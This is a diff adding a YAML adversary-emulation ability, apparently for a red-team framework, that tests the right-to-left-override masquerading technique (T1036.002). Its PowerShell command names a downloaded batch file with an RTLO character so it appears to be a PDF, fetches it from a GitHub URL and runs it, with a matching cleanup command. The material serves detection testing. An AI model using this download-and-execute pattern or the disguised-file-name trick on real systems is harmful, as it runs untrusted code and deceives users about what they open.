@@ -1,0 +1,24 @@
+---
+- id: 921ceb79e5a4b4afaae5a9e6a49253fe
+  name: 'Masquerading: RTLO Masqueraded File Download and Execution'
+  description: Downloads a batch file that has an obfuscated name utilizing the RTLO
+    operator. The batch file then runs automatically, opening a cmd window and then
+    closing 30 seconds later
+  tactic: stealth
+  technique:
+    attack_id: T1036.002
+    name: Masquerading:Right-to-Left Override
+  platforms:
+    windows:
+      psh:
+        command: $rtlo = [char]0x202E; $filepath = [System.IO.Path]::Combine($env:USERPROFILE,
+          "Downloads"); $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat");
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat"
+          -OutFile $fileloc -UseBasicParsing | Out-Null; Start-Process -FilePath $fileloc
+        payloads: []
+        cleanup: $rtlo = [char]0x202E; $filepath = [System.IO.Path]::Combine($env:USERPROFILE,
+          "Downloads"); $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat");
+          Remove-Item -Path $fileloc -Force -ErrorAction SilentlyContinue
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
